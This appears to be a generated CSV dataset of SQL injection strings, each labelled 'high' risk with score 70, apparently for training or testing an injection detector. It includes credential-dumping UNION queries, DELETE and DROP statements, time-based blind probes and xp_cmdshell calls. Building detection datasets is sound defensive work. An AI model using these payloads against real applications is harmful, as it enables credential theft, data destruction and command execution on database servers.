query,risk,score
'; DROP PROCEDURE admin_login-- -- 33h7yd,high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 2iuerd",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ftukc7,high,70
' OR SLEEP(5) AND '1'='1 /**/ # 4s,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # sf2o56d",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- jjzo2g,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ -- r",high,70
' OR SLEEP(5) AND '1'='1 -- gpk2e9,high,70
'; SELECT pg_sleep(5); -- /**/ # pn,high,70
'; DELETE FROM users; /**/ # m32cgzd,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- lq2uxa",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # k10tr4v",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 1443ft",high,70
' OR 1=1; DROP TABLE temp; -- /**/ /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
"' UNION ALL SELECT username, password FROM users /**/ -- 6",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ewplh8,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; DELETE FROM users; /**/ -- 7yv3d0,high,70
'; DROP PROCEDURE admin_login-- /**/ # 6u,high,70
' OR SLEEP(5) AND '1'='1 -- spngcv,high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # mnhuw1s,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- -- 6ymzw5,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ofikry",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # xp",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ip",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 1opqcco",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- fj9muk,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # dk",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1 -- ,high,70
'; DELETE FROM users; /**/ # gh4e3dh,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users /**/ /**/",high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 6yb0ul,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 81x1ns0,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- jind8m",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 36xpdhy",high,70
'; SELECT pg_sleep(5); -- # ogeurf8,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- cn0iyn",high,70
'; DROP PROCEDURE admin_login-- # 37oj8rs,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 9dp4mg,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- /**/ # vt,high,70
"' UNION ALL SELECT username, password FROM users -- u4g4r9",high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 8a65isk,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 22vwza,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; DELETE FROM users; /**/ -- qd1l8k,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR 1=1; DROP TABLE temp; -- -- vecsg7,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 2gkzaq,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # mqmkhfj,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # wfew4nu",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # oe",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # 8t",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- /**/ # tg,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ -- b,high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- v2vkxq,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 8ibilvd,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # y5okkba",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- /**/ -- 2,high,70
'; DROP PROCEDURE admin_login-- # h5udn0j,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # y84mgrs,high,70
' OR SLEEP(5) AND '1'='1 # chdoky0,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- 8",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- szodsq",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- -- plluiu,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users -- mge4fq",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- aexzoc",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- cevvc4,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # yz,high,70
'; DELETE FROM users; /**/ # 0vtxrdt,high,70
'; DROP PROCEDURE admin_login-- /**/ /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # 5t",high,70
'; WAITFOR DELAY '0:0:5'-- # 18bafxq,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ -- u",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- vmila5,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 5sq17uj,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users /**/ /**/",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # pbevo2d",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- /**/ -- x,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- # dhm008s,high,70
'; DELETE FROM users; /**/ -- tfinbw,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- -- 8sdmxu,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- uw96f5,high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
' OR SLEEP(5) AND '1'='1 -- 6r8xt8,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- 19mymx",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- r3wzt5",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # r0",high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR 1=1; DROP TABLE temp; -- # lg5rn5x,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 7iiyh7,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- sjutw3",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # ycg3rj8,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- -- wh2ywv,high,70
"' UNION ALL SELECT username, password FROM users # t209jxx",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ /**/",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # w8",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- m0ownp,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 5iwfrn,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # 0y,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 7rrtre",high,70
"' UNION ALL SELECT username, password FROM users -- hjcqfk",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 67f4exx",high,70
' OR 1=1; DROP TABLE temp; -- -- xdu89n,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ci",high,70
'; SELECT pg_sleep(5); -- /**/ -- p,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # zyo14rs,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # pm,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # q99516s",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ -- 1,high,70
"' UNION ALL SELECT username, password FROM users -- evekov",high,70
'; SELECT pg_sleep(5); -- /**/ -- 9,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ep,high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users # 6e5acul",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- i65hrx",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- 4kl5ou,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 # 65euhc8,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
'; DELETE FROM users; /**/ /**/ # hk,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- w8ve8x,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users # 54s0uqs",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- /**/ # a6,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- h90zib,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- t9uepe",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # i5j8f34,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ll",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 7cq632,high,70
'; DELETE FROM users; /**/ # bd37nrz,high,70
"' UNION ALL SELECT username, password FROM users -- gdjamw",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ /**/,high,70
'; DELETE FROM users; /**/ # npz9w00,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users -- j20wib",high,70
'; DROP PROCEDURE admin_login-- /**/ -- 5,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; DELETE FROM users; /**/ /**/ -- q,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- awe5qs,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ -- 5,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # p8",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- lg6z1q",high,70
'; SELECT pg_sleep(5); -- -- 44d7dn,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # 7a",high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 28hz6x,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 6bf488r,high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # 76,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
'; DELETE FROM users; /**/ /**/ # gt,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- # p4sykmh,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
'; DELETE FROM users; /**/ -- 6hh7wz,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- grsn88,high,70
'; SELECT pg_sleep(5); -- # h7r5se4,high,70
'; WAITFOR DELAY '0:0:5'-- -- zuwnih,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 1js3tx,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ -- d",high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- m0ma3y,high,70
'; SELECT pg_sleep(5); -- -- 6bsa3n,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ne1gky,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # ye61nfe",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 3lvwl8",high,70
'; WAITFOR DELAY '0:0:5'-- # ppkn70q,high,70
'; SELECT pg_sleep(5); -- -- 3mvaw0,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- uavd92,high,70
' OR 1=1; DROP TABLE temp; -- # io65llo,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # kx,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # n2pn8jg,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # ckwoiov",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 2k7sttm,high,70
' OR 1=1; DROP TABLE temp; -- -- bvnxcr,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # f0",high,70
'; SELECT pg_sleep(5); -- /**/ -- v,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- jxgtga,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- -- xztasf,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # kinkwz9,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
'; SELECT pg_sleep(5); -- /**/ # 75,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- -- krfs6y,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- # x46oupc,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ -- b,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ -- a",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; DROP PROCEDURE admin_login-- /**/ -- l,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # yk,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ /**/,high,70
